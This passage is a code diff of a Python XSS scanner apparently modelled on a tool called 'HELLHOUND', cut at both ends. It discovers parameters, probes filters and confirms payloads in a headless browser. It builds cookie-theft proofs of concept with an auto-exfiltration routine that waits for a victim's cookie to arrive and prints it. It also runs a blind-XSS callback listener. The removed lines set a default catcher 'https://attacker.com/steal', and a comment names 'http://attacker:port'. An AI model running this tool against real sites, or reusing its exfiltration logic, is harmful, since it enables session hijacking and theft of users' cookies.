-                                tprint(f"  {hit_lbl(f'Error probe → {color(name, C.BYELLOW)} @ {url[:55]}')}")
-        return list(found)
-
-    def fuzz_wordlist(self, url, method="GET", js_hints=None):
-        sentinel = "XS5P" + "".join(random.choices(string.digits, k=5))
-        wl = list(COMMON_PARAMS)
-        if js_hints:
-            for h in js_hints:
-                if isinstance(h, str) and h.isidentifier() and h not in wl:
-                    wl.insert(0, h)
-        base_body, base_status, base_len = self._baseline(url, method)
-        if not base_body and base_status == 0: return []
-        found = []
-
-        def _test(name):
-            r = self._req(url, method, {name: sentinel})
-            if not r: return
-            diff      = abs(len(r["body"]) - base_len)
-            reflected = sentinel in r["body"]
-            sc_change = (r["status"] != base_status
-                         and r["status"] not in (404, 500))
-            name_in   = (bool(re.search(r'\b'+re.escape(name)+r'\b',
-                                         r["body"], re.I)) and diff > 20)
-            if reflected or sc_change or diff > max(50, base_len * 0.05) or name_in:
-                reasons = []
-                if reflected:  reasons.append("reflected")
-                if sc_change:  reasons.append("status-change")
-                if diff > 50:  reasons.append(f"body-diff:{diff}")
-                if name_in:    reasons.append("name-in-body")
-                with self._lock:
-                    found.append({"name": name, "source": "wordlist", "reasons": reasons})
-
-        with ThreadPoolExecutor(max_workers=16) as pool:
-            list(pool.map(_test, wl))
-
-        tprint(f"  {ok(f'{len(wl)} wordlist probes → {len(found)} params discovered')}")
-        return found
-
-    def sniff_post(self, url):
-        found = set()
-        for probe in [{"__probe__": "1"}, {"action": "test"}, {}]:
-            r = self.client.post(url, probe)
-            if not r or r["status"] not in (400, 422, 200): continue
-            for pat in self.ERR_PATS:
-                for m in pat.findall(r["body"]):
-                    name = m.strip().lower()
-                    if (3 <= len(name) <= 30 and name.isidentifier()
-                            and name not in self.NOISE):
-                        found.add(name)
-        return list(found)
-
-    def discover(self, url, method, existing=None, js_hints=None):
-        all_p = {}
-        for p in (existing or []):
-            all_p[p] = {"name": p, "source": "crawl"}
-        for n in self.probe_errors(url, method):
-            if n not in all_p:
-                all_p[n] = {"name": n, "source": "error_probe"}
-        for p in self.fuzz_wordlist(url, method, js_hints):
-            if p["name"] not in all_p:
-                all_p[p["name"]] = {"name": p["name"], "source": "wordlist"}
-        if method == "POST":
-            for n in self.sniff_post(url):
-                if n not in all_p:
-                    all_p[n] = {"name": n, "source": "post_sniff"}
-        return list(all_p.values())
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# FILTER ANALYZER — characterizes WAF/Sanitizer behavior
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# FILTER ANALYZER --- characterizes WAF/Sanitizer behavior
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class FilterAnalyzer:
     """
     Performs lightweight character survivability tests to understand:
@@ -1688,9 +1093,9 @@ class FilterAnalyzer:
         return char.replace("<","&lt;").replace(">","&gt;").replace("\"","&quot;").replace("'","&#39;")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# PLAYWRIGHT VALIDATOR — runtime browser confirmation
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# PLAYWRIGHT VALIDATOR --- runtime browser confirmation
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class PlaywrightValidator:
     """
     Headless browser validation for high-confidence XSS findings.
@@ -1704,69 +1109,68 @@ class PlaywrightValidator:
             os.makedirs(evidence_dir)
 
     def validate(self, url, method, param, payload, all_params, hidden=None):
-        """
-        Loads the payload in a real browser.
-        Returns (confirmed: bool, screenshot_path: str, events: list).
-        """
         if not PLAYWRIGHT_INSTALLED:
             return False, None, ["playwright-not-installed"]
 
-        confirmed = False
-        events = []
-        screenshot_path = None
-        
-        # Build the URL (only handles GET for now, POST requires more complex setup)
-        if method != "GET":
-            return False, None, ["playwright-get-only-for-now"]
+        confirmed, events, screenshot_path = False, [], None
+        # Merge all parameters for the request
+        full_params = {**{p: "test" for p in all_params if p != param}, **(hidden or {}), param: payload}
 
-        p_url = PoC.browser(url, method, param, payload, all_params, hidden)
-        
         try:
             with sync_playwright() as p:
                 browser = p.chromium.launch(headless=self.headless)
                 context = browser.new_context(ignore_https_errors=True)
                 page = context.new_page()
 
-                # Event handlers
-                def on_dialog(dialog):
+                # Robust execution listeners
+                def handle_signal(sig_type, msg):
                     nonlocal confirmed
-                    confirmed = True
-                    events.append(f"dialog:{dialog.type}:{dialog.message}")
-                    dialog.dismiss()
-
-                def on_console(msg):
-                    nonlocal confirmed
-                    if "alert" in msg.text.lower() or "xs5" in msg.text.lower():
+                    m_lower = msg.lower()
+                    if any(x in m_lower for x in ["alert", "confirm", "prompt", "1", "xs5"]):
                         confirmed = True
-                    events.append(f"console:{msg.type}:{msg.text[:50]}")
+                        events.append(f"{sig_type}:CONFIRMED:{msg[:50]}")
+                    else:
+                        events.append(f"{sig_type}:LOG:{msg[:30]}")
 
-                page.on("dialog", on_dialog)
-                page.on("console", on_console)
+                page.on("dialog", lambda d: (handle_signal("dialog", f"{d.type}:{d.message}"), d.dismiss()))
+                page.on("console", lambda m: handle_signal("console", f"{m.type}:{m.text}"))
+                page.on("pageerror", lambda e: events.append(f"js-err:{str(e)[:50]}"))
 
                 try:
-                    page.goto(p_url, timeout=10000, wait_until="load")
-                    # Extra wait for async payloads
-                    page.wait_for_timeout(2000)
+                    if method == "GET":
+                        target = url + ("&" if "?" in url else "?") + urllib.parse.urlencode(full_params)
+                        page.goto(target, timeout=15000, wait_until="networkidle")
+                    else:
+                        # POST Support: Inject a self-submitting form into a blank page
+                        page.goto("about:blank")
+                        form_html = f"""
+                        <form id="pk" method="POST" action="{url}">
+                            {" ".join([f'<input type="hidden" name="{k}" value="{str(v).replace('"', '&quot;')}">' for k,v in full_params.items()])}
+                        </form>
+                        <script>document.getElementById('pk').submit();</script>
+                        """
+                        page.set_content(form_html)
+                    
+                    page.wait_for_timeout(3000) # Increased wait for async execution
                 except Exception as e:
-                    events.append(f"page-load-error:{str(e)[:50]}")
+                    events.append(f"nav-err:{str(e)[:40]}")
 
                 if confirmed:
                     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    safe_param = "".join(c for c in param if c.isalnum())
-                    fname = f"xss_{safe_param}_{ts}.png"
+                    fname = f"xss_{"".join(c for c in param if c.isalnum())}_{ts}.png"
                     screenshot_path = os.path.join(self.evidence_dir, fname)
                     page.screenshot(path=screenshot_path)
                     
                 browser.close()
         except Exception as e:
-            events.append(f"playwright-error:{str(e)[:50]}")
+            events.append(f"pw-err:{str(e)[:40]}")
 
         return confirmed, screenshot_path, events
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # CONFIDENCE SCORER
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class Scorer:
     """Calculates a confidence score (0-100) based on multiple heuristics."""
     @staticmethod
@@ -1796,190 +1200,84 @@ class Scorer:
         return min(max(score, 0), 100)
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# XSS VERIFIER  v2  — context-aware, low false-negative, 5-stage
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# XSS VERIFIER  v2  --- context-aware, low false-negative, 5-stage
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class XSSVerifier:
     """
-    5-stage verification pipeline — designed to FIND vulns not miss them:
-
-    Stage 1  SEND    — inject payload, get response
-    Stage 2  REFLECT — is any form of the payload in the body?
-                        • exact match
-                        • case-insensitive match
-                        • partial key fragment (handles tag-split responses)
-    Stage 3  PATTERN — does the response contain a live XSS confirm pattern?
-                        OR does a reflection appear in a non-escaped context?
-    Stage 4  ESCAPE  — is the reflection HTML-encoded? (only reject if FULLY escaped)
-    Stage 5  CONTROL — does a neutral value also trigger patterns?
-                        (removes false positives from pages with existing XSS patterns)
-
-    Key improvements over v1:
-      • case_reflection alone IS enough to confirm when a pattern also matches
-      • Escape check only rejects when payload is ONLY in escaped form
-      • Control check diffs against the ACTUAL baseline, not a new request
-      • Context detection: detects HTML/attr/JS reflection context
-      • Fragment check: if any unique fragment of payload appears unescaped,
-        counts as partial reflection (catches tag-split sanitizers)
-      • Adds xss_type to each finding: reflected_html / reflected_attr /
-        reflected_js / reflected_url / partial_bypass
+    5-stage verification pipeline.
+    FIXED: Deep context detection, fragment-based partial bypass detection, 
+           and smart URL breakout logic.
     """
-
-    # Unique short fragments that indicate real injection in body
     _FRAGS = [
-        "<script>", "<svg", "<img", "<iframe", "onerror=", "onload=",
-        "alert(", "alert`", "javascript:", "onfocus=", "ontoggle=",
-        "onmouseover=", "confirm(", "prompt(", "document.cookie",
+        "<script", "<svg", "<img", "<iframe", "onerror=", "onload=", "onclick=", "onfocus=", "ontoggle=",
+        "alert(", "alert`", "confirm(", "prompt(", "javascript:", "document.cookie", ".innerHTML"
     ]
 
     def __init__(self, client):
-        self.client   = client
-        self._baseline_cache = {}  # url+method → baseline body (avoid re-fetching)
+        self.client = client
 
-    def _send(self, url, method, params):
-        try:
-            return (self.client.post(url, params) if method == "POST"
-                    else self.client.get(url, params))
-        except Exception: return None
-
-    # ── Context detection ─────────────────────────────────────────────────────
     @staticmethod
-    def _detect_context(body, param_val):
-        """
-        Detect where in the response param_val appears.
-        Returns one of: "html" | "attr" | "js" | "url" | "unknown"
-        """
-        pos = body.lower().find(param_val.lower())
+    def _detect_context(body, val):
+        """Stateful detection of the reflection context."""
+        pos = body.lower().find(val.lower())
         if pos == -1: return "unknown"
-        pre = body[max(0, pos-120):pos]
-        if re.search(r'(?:href|src|action|data|value|content)\s*=\s*["a-z][^"]*$', pre, re.I):
-            return "attr"
-        if re.search(r'(?:<script[^>]*>|javascript:)[^<]*$', pre, re.I):
+        chunk = body[:pos]
+        
+        # 1. Script block check
+        if chunk.lower().count("<script") > chunk.lower().count("</script"):
             return "js"
-        if re.search(r'url\s*\(', pre, re.I):
-            return "url"
+        # 2. HTML Comment check
+        if chunk.count("<!--") > chunk.count("-->"):
+            return "comment"
+        # 3. Tag attribute check
+        last_lt = chunk.rfind("<")
+        last_gt = chunk.rfind(">")
+        if last_lt > last_gt:
+            at_chunk = chunk[last_lt:].lower()
+            if any(x in at_chunk for x in ["href=", "src=", "action=", "data="]):
+                return "url_attr"
+            return "attr"
         return "html"
 
-    # ── Reflection detection (permissive) ─────────────────────────────────────
     def _reflected(self, body, payload):
-        """
-        Returns (reflected: bool, how: str, context: str).
-        'how' is one of: exact / case / fragment / none
-        """
-        if payload in body:
-            return True, "exact", self._detect_context(body, payload)
-        if payload.lower() in body.lower():
-            return True, "case", self._detect_context(body, payload.lower())
-        # Fragment check — any distinctive XSS fragment from payload in body
-        pl_lower = payload.lower()
-        for frag in self._FRAGS:
-            if frag in pl_lower and frag in body.lower():
-                return True, "fragment:" + frag, "html"
+        ctx = self._detect_context(body, payload)
+        if payload in body: return True, "exact", ctx
+        if payload.lower() in body.lower(): return True, "case", ctx
+        
+        # Fragment match: Catch cases where tags are stripped but logic remains
+        matched = [f for f in self._FRAGS if f in payload.lower() and f in body.lower()]
+        if len(matched) >= 2 or (len(matched) == 1 and "<" in matched[0]):
+            return True, f"fragment:{matched[0]}", ctx
         return False, "none", "unknown"
 
-    # ── Escape check (precise) ────────────────────────────────────────────────
-    @staticmethod
-    def _fully_escaped(body, payload):
-        """
-        Returns True ONLY if the payload is present exclusively in HTML-escaped form.
-        Does NOT return True if raw payload also appears.
-        """
-        if payload in body:
-            return False   # raw version present → not fully escaped
-        esc_variants = [
-            payload.replace("<","&lt;").replace(">","&gt;").replace('"','&quot;').replace("'","&#39;"),
-            payload.replace("<","&lt;").replace(">","&gt;"),
-            payload.replace('"','&quot;'),
-        ]
-        body_lower = body.lower()
-        pl_lower   = payload.lower()
-        return any(v.lower() in body_lower for v in esc_variants) and pl_lower not in body_lower
-
-    # ── Pattern check (diff against baseline) ────────────────────────────────
-    def _new_patterns(self, body, baseline_body, payload):
-        """
-        Find XSS confirm patterns that appear in `body` but NOT in `baseline_body`.
-        Returns list of matched pattern strings.
-        Diffing against baseline eliminates FP from pages with existing scripts.
-        """
-        hits = []
-        for pat in XSS_CONFIRM_RE:
-            in_body     = bool(pat.search(body))
-            in_baseline = bool(pat.search(baseline_body))
-            if in_body and not in_baseline:
-                hits.append("pattern:" + pat.pattern[:30])
-        return hits
-
-    # ── URL-only check (fixed logic) ──────────────────────────────────────────
-    def _only_in_url_attrs(self, body, payload):
-        """
-        Returns True ONLY when every occurrence of the payload is inside
-        a URL-type attribute (href=, src=, action=). 
-        Returns False (don't suppress) when any clean occurrence exists.
-        """
-        pl_lower = payload.lower()
-        positions = [m.start() for m in re.finditer(re.escape(pl_lower), body.lower())]
-        if not positions: return False
-        clean_count = 0
-        for pos in positions:
-            ctx = body[max(0, pos-150):pos+len(payload)+10]
-            pat_str = r'(?:href|src|action)\s*=\s*[^>]*' + re.escape(pl_lower[:12])
-            in_url_attr = bool(re.search(pat_str, ctx, re.I))
-
-            if not in_url_attr:
-                clean_count += 1
-        return clean_count == 0   # all occurrences are inside URL attrs
-
-    # ── Main verify ───────────────────────────────────────────────────────────
-    def verify(self, url, method, param, all_params, payload,
-               baseline_body, hidden=None):
-        """
-        Returns (confirmed: bool, signals: list[str], response | None).
-
-        confirmed=True means the payload executed or is highly likely executable.
-        signals describe what was found (for reporting).
-        """
-        # ── Stage 1: Send ────────────────────────────────────────────────────
-        fill = {**{p: "test" for p in all_params if p != param},
-                **(hidden or {}), param: payload}
-        resp = self._send(url, method, fill)
+    def verify(self, url, method, param, all_params, payload, baseline_body, hidden=None):
+        fill = {**{p: "test" for p in all_params if p != param}, **(hidden or {}), param: payload}
+        resp = self.client.post(url, fill) if method == "POST" else self.client.get(url, fill)
         if not resp: return False, [], None
         body = resp["body"]
-        sigs = []
-
-        # ── Stage 2: Reflection check ────────────────────────────────────────
+        
         reflected, how, ctx = self._reflected(body, payload)
-        if not reflected:
-            return False, [], resp
-        sigs.append(f"reflect:{how}:{ctx}")
+        if not reflected: return False, [], resp
+        sigs = [f"reflect:{how}:{ctx}"]
+        
+        # Escape check: Only reject if NO breakout characters or raw signals survived
+        if all(x in body for x in [payload.replace("<","&lt;"), payload.replace(">","&gt;")]) and "<" not in body:
+            if ctx != "js": return False, ["escaped"], resp
 
-        # ── Stage 3: Fully escaped? → reject ────────────────────────────────
-        if self._fully_escaped(body, payload):
-            return False, ["escaped"], resp
-
-        # ── Stage 4: Diff patterns against baseline ──────────────────────────
         new_pats = self._new_patterns(body, baseline_body, payload)
         sigs.extend(new_pats)
 
-        # ── Stage 5: URL-only? → reject if no new patterns found ────────────
-        if self._only_in_url_attrs(body, payload) and not new_pats:
-            return False, ["url_only"], resp
+        # Smart Breakout Logic: Never reject url_attr if quotes or tag closers survived
+        if ctx == "url_attr" and not new_pats:
+            if not any(c in payload and c in body for c in ['"', "'", ">", "<"]):
+                return False, ["url_only"], resp
 
-        # ── Confirm decision ─────────────────────────────────────────────────
-        # Confirm if:  new patterns appeared  OR  exact/case reflection in HTML/attr/JS ctx
-        #              (URL context alone is not confirmed without a pattern)
-        has_pattern    = bool(new_pats)
-        good_ctx       = ctx in ("html", "attr", "js")
-        exact_or_case  = how in ("exact", "case")
-        fragment_match = how.startswith("fragment:")
-
-        confirmed = (
-            has_pattern or                        # new XSS pattern appeared
-            (exact_or_case and good_ctx) or       # raw payload in live context
-            (fragment_match and has_pattern)      # fragment + pattern
-        )
-
+        confirmed = bool(new_pats) or (how in ("exact", "case") and ctx in ("html", "attr", "js", "url_attr"))
         return confirmed, sigs, resp
+
+    def _new_patterns(self, body, baseline, payload):
+        return ["pattern:"+p.pattern[:30] for p in XSS_CONFIRM_RE if p.search(body) and not p.search(baseline)]
 
     def verify_stored(self, token, url):
         """Check if a stored XSS token appears unescaped in a retrieval URL."""
@@ -1991,9 +1289,9 @@ class XSSVerifier:
             return not (esc in body and token not in body)
         except Exception: return False
 
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # PoC BUILDER
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class PoC:
     @staticmethod
     def _qs(param, payload, all_params, hidden):
@@ -2035,16 +1333,16 @@ class PoC:
         return pocs
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# XSS TESTER  — HELLHOUND-style output + progress bars
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# XSS TESTER  --- HELLHOUND-style output + progress bars
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class XSSTester:
-    def __init__(self, client, tier=5, delay=0.0,
-                 catcher="https://attacker.com/steal"):
+    def __init__(self, client, tier=1, delay=0.0, catcher=None, hud_state=None):
         self.client   = client
         self.tier     = tier
         self.delay    = delay
         self.catcher  = catcher
+        self.hud      = hud_state
         self.verifier = XSSVerifier(client)
         self.analyzer = FilterAnalyzer(client)
         self.pw       = PlaywrightValidator(headless=True)
@@ -2061,24 +1359,27 @@ class XSSTester:
 
     def _print_hit(self, url, method, param, payload, sigs,
                    sc, burl, ck_pocs, score, stolen=None, pw_ev=None):
-        """HELLHOUND-style finding display."""
-        sys.stdout.write("\r" + " " * 65 + "\r")
-        tprint(f"\n  {color('VULN', C.BRED, C.BOLD)} {color(method, C.BYELLOW)} {color(url, C.BWHITE)}")
-        tprint(f"  {color('  param   :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
-        tprint(f"  {color('  score   :', C.DIM)} {color(str(score)+'%', C.BGREEN if score >= 80 else C.BYELLOW, C.BOLD)}")
-        tprint(f"  {color('  payload :', C.DIM)} {color(payload[:100], C.BRED)}")
-        tprint(f"  {color('  signals :', C.DIM)} {color(', '.join(sigs[:4]), C.BGREEN)}")
+        """Clean, high-visibility finding report."""
+        # Sys.stdout.write is removed as Rich handled clearing lines
+        tprint(f"\n[bold white on red] FOUND [/] [bold white]{url}[/]")
+        
+        info_line = (f"  [dim]param:[/] [bold orange3]{param}[/] "
+                     f" [dim]| score:[/] [bold {'green' if score >= 80 else 'yellow'}]{score}%[/] "
+                     f" [dim]| status:[/] [bold white]{sc}[/]")
+        tprint(info_line)
+        
+        tprint(f"  [dim]payload:[/] [bold red]{payload[:110]}[/]")
+        
+        if sigs:
+            tprint(f"  [dim]signals:[/] [bold green]{', '.join(sigs[:5])}[/]")
+        
         if pw_ev:
-            tprint(f"  {color('  browser :', C.DIM)} {color('CONFIRMED via Playwright', C.BCYAN, C.BOLD)}")
-            for ev in pw_ev: tprint(f"    {color('↳', C.DIM)} {color(ev, C.DIM)}")
-        tprint(f"  {color('  status  :', C.DIM)} {color(str(sc), C.BWHITE)}")
-        if burl:
-            tprint(f"  {color('  browser :', C.DIM)} {color(burl, C.BCYAN)}")
+            tprint(f"  [dim]browser:[/] [bold cyan]CONFIRMED[/] [dim]via Playwright[/]")
+            for ev in pw_ev: tprint(f"    [dim]->[/] [dim]{ev}[/]")
+        
         if stolen:
-            tprint(f"  {color('  cookie  :', C.DIM)} {color(stolen, C.fg(214), C.BOLD)}")
-        elif ck_pocs:
-            cp = ck_pocs[0]
-            tprint(f"  {color('  ck-exfil:', C.DIM)} {color(cp.get('browser',''), C.BRED)}")
+            tprint(f"  [dim]cookie :[/] [bold orange3]{stolen}[/]")
+        tprint(Rule(style="dim"))
 
     def _auto_exfil(self, ck_pocs, catcher_obj):
         """Agent visits the XSS URL and waits for cookie to arrive."""
@@ -2118,10 +1419,10 @@ class XSSTester:
     def _prioritise_payloads(payloads, ctx, tier_cap):
         """
         Re-order payload list to put context-appropriate payloads first.
-        Payloads for the detected context fire first → faster confirmation.
+        Payloads for the detected context fire first --- faster confirmation.
         Falls back to all payloads after context-specific ones.
         """
-        # Context → best payload types to try first
+        # Context --- best payload types to try first
         ctx_types = {
             "html":    ["html", "poly", "mxss"],
             "attr":    ["attr", "html", "poly"],
@@ -2137,113 +1438,104 @@ class XSSTester:
         rest   = [p for p in tier_ok if p["type"] not in priority]
         return first + rest
 
-    def test_endpoint(self, n, tot, url, method, params, hidden):
-        pnames   = list(params.keys())
-        baseline = self._baseline(url, method, params, hidden)
-
-        sys.stdout.write(
-            f"\r  {color(f'  [{n}/{tot}] {method} {url[:55]}', C.DIM)}  ")
-        sys.stdout.flush()
+    def test_endpoint(self, n, tot, url, method, params, hidden, progress_bar=None, task_id=None):
+        """
+        HELLHOUND-class endpoint test loop.
+        FIXED: Robust signal passing to Scorer and accurate context-based prioritizing.
+        """
+        pnames = list(params.keys()); baseline = self._baseline(url, method, params, hidden)
+        if progress_bar and task_id:
+            progress_bar.update(task_id, description=f"[cyan]Testing {url[:40]}...")
 
         for param in pnames:
             param_confirmed = False
-
-            # ── Filter analysis: check which chars survive ───────────────────
-            filter_map = self.analyzer.analyze(url, method, param, pnames, hidden)
-            
-            # ── Context probe: detect where this param is reflected ───────────
-            ctx = self._probe_context(url, method, param, pnames, hidden)
-
-            # ── Context-prioritised payload order ────────────────────────────
-            ordered = self._prioritise_payloads(PAYLOADS, ctx, self.tier)
+            self.analyzer.analyze(url, method, param, pnames, hidden) # Pre-analysis
+            ctx = self._probe_context(url, method, param, pnames, hidden) # Context probe
+            ordered = self._prioritise_payloads(PAYLOADS, ctx, self.tier) # Re-order list
 
             for pd in ordered:
                 if param_confirmed: break
                 payload = pd["pl"]
-                confirmed, sigs, resp = self.verifier.verify(
-                    url, method, param, pnames, payload, baseline, hidden)
+                
+                if self.hud:
+                    self.hud.update(requests_sent=self.hud.requests_sent + 1)
+                    self.hud.update(log=f"[dim]Audit:[/] {method} {url[:40]} [{param}]")
+
+                confirmed, sigs, resp = self.verifier.verify(url, method, param, pnames, payload, baseline, hidden)
                 if self.delay: time.sleep(self.delay)
                 if not confirmed: continue
 
-                param_confirmed = True
-                sc     = resp["status"] if resp else 0
-                burl   = PoC.browser(url, method, param, payload, pnames, hidden)
-                curl_c = PoC.curl(url, method, param, payload, pnames, hidden)
-                ck_pocs= PoC.cookie_pocs(url, method, param, pnames,
-                                          self.catcher, hidden)
+                # Deep signal extraction for the Scorer
+                r_sig = [s for s in sigs if s.startswith("reflect:")][0]
+                _, how, det_ctx = r_sig.split(":", 2)
+
+                param_confirmed = True; sc = resp["status"] if resp else 0
+                burl = PoC.browser(url, method, param, payload, pnames, hidden)
+                ck_pocs = PoC.cookie_pocs(url, method, param, pnames, self.catcher, hidden)
                 stolen = self._auto_exfil(ck_pocs, self._catcher_obj)
-                if stolen:
-                    tprint(f"\n  {ck_lbl('COOKIE STOLEN  ←  auto-exfil')}")
-                    tprint(f"  {color('  '+stolen, C.fg(214), C.BOLD)}")
 
-                # ── Step 6: Browser validation for high confidence ───────────
-                pw_confirmed = False
-                pw_ev = []
-                screenshot = None
-                if confirmed and ctx in ("html", "attr", "js"):
-                    pw_confirmed, screenshot, pw_ev = self.pw.validate(
-                        url, method, param, payload, pnames, hidden)
+                # Headless browser confirmation (Playwright)
+                pw_confirmed, screenshot, pw_ev = self.pw.validate(url, method, param, payload, pnames, hidden)
+                score = Scorer.calculate(sigs, how, det_ctx, confirmed, pw_confirmed)
 
-                # ── Step 7: Final Scoring ────────────────────────────────────
-                score = Scorer.calculate(sigs, how, ctx, confirmed, pw_confirmed)
-
-                # Classify XSS type from signals
-                xss_type = "reflected_" + ctx if ctx not in ("none","unknown") else "reflected"
-                for s in sigs:
-                    if "mxss" in pd.get("type",""):  xss_type = "mutation"; break
-                    if "uxss" in pd.get("type",""):  xss_type = "uxss";     break
+                # Classification
+                xss_type = "reflected_" + det_ctx if det_ctx not in ("none","unknown") else "reflected"
+                if "mxss" in pd.get("type",""): xss_type = "mutation"
+                elif "uxss" in pd.get("type",""): xss_type = "universal"
 
                 f_entry = {
-                    "url": url, "method": method, "param": param,
-                    "payload": payload, "payload_id": pd["id"],
-                    "tier": pd["tier"], "type": pd["type"],
-                    "xss_type": xss_type, "context": ctx,
-                    "signals": sigs, "confirmed": confirmed, 
-                    "pw_confirmed": pw_confirmed, "pw_events": pw_ev,
-                    "screenshot": screenshot, "score": score,
-                    "status": sc, "curl": curl_c, "browser": burl,
-                    "cookie_pocs": ck_pocs, "exfil_cookie": stolen,
-                    "ts": datetime.now().isoformat(),
+                    "url": url, "method": method, "param": param, "payload": payload,
+                    "xss_type": xss_type, "context": det_ctx,
+                    "signals": sigs, "confirmed": confirmed, "pw_confirmed": pw_confirmed,
+                    "pw_events": pw_ev, "screenshot": screenshot, "score": score,
+                    "status": sc, "ts": datetime.now().isoformat(),
                 }
-                with self._lock:
-                    self.findings.append(f_entry)
-                self._print_hit(url, method, param, payload, sigs, sc,
-                                burl, ck_pocs, score, stolen, pw_ev)
+                with self._lock: self.findings.append(f_entry)
+                if self.hud: self.hud.add_finding(f_entry)
+                self._print_hit(url, method, param, payload, sigs, sc, burl, ck_pocs, score, stolen, pw_ev)
 
     def run(self, endpoints, catcher_obj=None, threads=8):
         self._catcher_obj = catcher_obj
-        section("PHASE 4/4 — XSS TESTING & VERIFICATION", "⚡")
-        total = sum(len(ep["params"]) for ep in endpoints)
-        tprint(f"  {info(f'{len(endpoints)} endpoints · {total} parameters · {threads} workers')}")
-        tprint(f"  {info(f'Tier cap: {self.tier} | Cookie exfil: {bool(catcher_obj)}')}\n")
+        section("PHASE 4/4 --- XSS TESTING & VERIFICATION")
+        total_p = sum(len(ep["params"]) for ep in endpoints)
+        console.print(info(f"{len(endpoints)} endpoints -- {total_p} parameters -- {threads} workers"))
+        console.print(info(f"Tier cap: {self.tier} | Cookie exfil: {bool(catcher_obj)}"))
+        console.print()
 
-        done_count = [0]
-        tot        = len(endpoints)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold magenta]Phase 4:[/] [bold cyan]{task.description}"),
+            BarColumn(complete_style="magenta"),
+            MofNCompleteColumn(),
+            TimeRemainingColumn(),
+            console=console,
+            transient=True
+        ) as progress_bar:
+            overall_task = progress_bar.add_task("Total Audit Progress", total=len(endpoints))
 
-        def _run_ep(args_tuple):
-            i, ep = args_tuple
-            self.test_endpoint(i, tot,
-                               ep["url"], ep["method"],
-                               ep["params"], ep.get("hidden", {}))
-            with self._lock:
-                done_count[0] += 1
-            sys.stdout.write(f"\r  {progress(done_count[0], tot)}  ")
-            sys.stdout.flush()
+            def _run_ep(args_tuple):
+                i, ep = args_tuple
+                if self.hud: self.hud.update(current_action=f"Auditing Endpoint {i}")
+                self.test_endpoint(i, len(endpoints),
+                                   ep["url"], ep["method"],
+                                   ep["params"], ep.get("hidden", {}),
+                                   progress_bar=progress_bar, task_id=overall_task)
+                progress_bar.update(overall_task, advance=1)
+                if self.hud: self.hud.update(endpoints_tested=i)
 
-        workers = min(threads, len(endpoints)) if endpoints else 1
-        with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
-            list(pool.map(_run_ep, enumerate(endpoints, 1)))
+            workers = min(threads, len(endpoints)) if endpoints else 1
+            with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
+                list(pool.map(_run_ep, enumerate(endpoints, 1)))
 
-        sys.stdout.write("\r" + " " * 65 + "\r")
         return self.findings
 
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# BLIND XSS OOB LISTENER  — self-hosted callback for out-of-band detection
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# BLIND XSS OOB LISTENER  --- self-hosted callback for out-of-band detection
 # Listens on a random port; payloads POST/GET to it with a token.
 # Confirms stored/blind XSS without needing a browser.
-# ─────────────────────────────────────────────────────────────────────────────
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 class BlindXSSServer:
     """
     Embeds a lightweight HTTP server.  Blind XSS payloads carry BTOKEN in
@@ -2275,15 +1567,13 @@ class BlindXSSServer:
                 param = qs.get("p", ["?"])[0]
                 src   = qs.get("u", ["?"])[0]
                 ua    = self.headers.get("User-Agent","")
-                ts    = datetime.now().strftime("%H:%M:%S")
                 with srv_ref._lock:
                     srv_ref._hits.append({"token":token,"param":param,
-                                          "src":src,"ua":ua,"ts":ts})
-                tprint(f"\n  {color('BLIND XSS HIT', C.BRED, C.BOLD)}  "
-                       f"{color(ts, C.DIM)}")
-                tprint(f"  {color('  param :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
-                tprint(f"  {color('  src   :', C.DIM)} {color(src[:70], C.BCYAN)}")
-                tprint(f"  {color('  UA    :', C.DIM)} {color(ua[:60], C.DIM)}\n")
+                                          "src":src,"ua":ua})
+                tprint(f"\n  {color('BLIND XSS HIT', 'bold red')}")
+                tprint(f"  {color('  param :', 'dim')} {color(param, 'bold red')}")
+                tprint(f"  {color('  src   :', 'dim')} {color(src[:70], 'cyan')}")
+                tprint(f"  {color('  UA    :', 'dim')} {color(ua[:60], 'dim')}\n")
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b"ok")
@@ -2313,15 +1603,15 @@ class BlindXSSServer:
         if self._server: self._server.shutdown()
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# BLIND XSS PAYLOADS  — OOB callback payloads (replaced at runtime)
+# ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+# BLIND XSS PAYLOADS  --- OOB callback payloads (replaced at runtime)
 # BURL  = http://attacker:port
 # BTOKEN = unique token per scan
